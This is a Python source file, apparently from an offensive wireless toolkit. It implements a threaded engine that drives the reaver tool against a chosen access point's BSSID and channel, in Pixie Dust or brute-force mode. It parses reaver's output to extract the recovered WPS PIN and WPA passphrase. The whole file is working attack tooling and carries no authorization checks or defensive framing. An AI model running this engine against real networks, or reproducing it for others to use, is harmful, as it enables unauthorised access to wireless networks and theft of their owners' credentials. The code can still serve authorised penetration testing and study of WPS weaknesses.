from __future__ import annotations

import re
import subprocess
import tempfile
import threading
from pathlib import Path

from core.process import ManagedProcess


class WPSAttackError(RuntimeError):
    pass


class WPSAttackEngine:
    def __init__(
        self,
        interface: str,
        bssid: str,
        channel: str,
        on_log,
        on_success,
        mode: str = "pixie",
    ):
        self.interface = interface
        self.bssid = bssid
        self.channel = str(channel)

        self.on_log = on_log
        self.on_success = on_success

        self.mode = mode

        self.stop_event = threading.Event()
        self.lifecycle_lock = threading.RLock()

        self.process: ManagedProcess | None = None
        self.thread: threading.Thread | None = None

        self.running = False
        self.success = False

        self.session_dir = Path(
            tempfile.mkdtemp(
                prefix="vekt_wps_",
            )
        )

        self.output_path = self.session_dir / "wps-output.log"

    def is_alive(self) -> bool:
        with self.lifecycle_lock:
            return self.running

    def start(self) -> None:
        with self.lifecycle_lock:
            if self.running:
                raise WPSAttackError("WPS attack is already running.")

            self._validate()

            self.stop_event.clear()
            self.success = False
            self.running = True

            self.thread = threading.Thread(
                target=self._run,
                name="vekt-wps-engine",
                daemon=True,
            )

            self.thread.start()

    def stop(self) -> None:
        with self.lifecycle_lock:
            if not self.running:
                return

            self.stop_event.set()

            process = self.process

            if process is not None:
                try:
                    process.cleanup(timeout=2)
                except Exception as exc:
                    self.on_log(f"[-] WPS process cleanup failed: {exc}")
                finally:
                    self.process = None

            thread = self.thread

            if (
                thread is not None
                and thread.is_alive()
                and thread is not threading.current_thread()
            ):
                thread.join(timeout=3)

                if thread.is_alive():
                    self.on_log("[!] WPS worker did not terminate gracefully.")

            self.thread = None
            self.running = False

            if self.success:
                self.on_log("[+] WPS job completed successfully.")
            else:
                self.on_log("[!] WPS job stopped.")

            self._cleanup()

    def _validate(self) -> None:
        if not self.interface:
            raise WPSAttackError("Wireless interface is required.")

        if not self.bssid:
            raise WPSAttackError("Target BSSID is required.")

        if not self.channel:
            raise WPSAttackError("Target channel is required.")

        if self.mode not in {
            "pixie",
            "bruteforce",
        }:
            raise WPSAttackError(f"Unsupported WPS mode: {self.mode}")

    def _run(self) -> None:
        try:
            command = self._build_command()

            self.on_log(f"[*] Starting WPS job in {self.mode} mode.")

            self.process = ManagedProcess(
                command,
                name="wps-engine",
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )

            self.process.start()

            process = self.process.process

            if process is None:
                raise WPSAttackError("WPS process was not created.")

            output_file = self.output_path.open(
                "w",
                encoding="utf-8",
                errors="ignore",
            )

            try:
                stream = process.stdout

                if stream is None:
                    raise WPSAttackError("WPS process output is unavailable.")

                for line in stream:
                    if self.stop_event.is_set():
                        break

                    text = line.rstrip()

                    if not text:
                        continue

                    output_file.write(text + "\n")

                    output_file.flush()

                    self.on_log(text)

                    self._parse_result(text)

                    if self.success:
                        self.stop_event.set()
                        break

            finally:
                output_file.close()

            if self.stop_event.is_set():
                if self.success:
                    return

                return

            returncode = self.process.returncode

            if returncode not in (
                0,
                1,
                None,
            ):
                raise WPSAttackError(f"WPS process exited with code {returncode}")

        except Exception as exc:
            if not self.stop_event.is_set():
                self.on_log(f"[-] WPS job failed: {exc}")

        finally:
            process = self.process

            if process is not None:
                try:
                    process.cleanup(timeout=2)
                except Exception as exc:
                    self.on_log(f"[-] WPS process finalization failed: {exc}")

            self.process = None

            with self.lifecycle_lock:
                self.running = False

    def _build_command(self) -> list[str]:
        command = [
            "reaver",
            "-i",
            self.interface,
            "-b",
            self.bssid,
            "-c",
            self.channel,
            "-vv",
        ]

        if self.mode == "pixie":
            command.extend(
                [
                    "-K",
                    "1",
                ]
            )

        return command

    def _parse_result(
        self,
        line: str,
    ) -> None:
        pin_match = re.search(
            r"WPS PIN:\s*['\"]?([^'\"]+)['\"]?",
            line,
            flags=re.IGNORECASE,
        )

        if pin_match:
            pin = pin_match.group(1).strip()

            if pin:
                self.on_success(
                    "pin",
                    pin,
                )

        psk_match = re.search(
            r"WPA PSK:\s*['\"]?([^'\"]+)['\"]?",
            line,
            flags=re.IGNORECASE,
        )

        if psk_match:
            psk = psk_match.group(1).strip()

            if psk:
                self.success = True

                self.on_success(
                    "psk",
                    psk,
                )

    def _cleanup(self) -> None:
        try:
            self.session_dir.rmdir()
        except OSError:
            pass
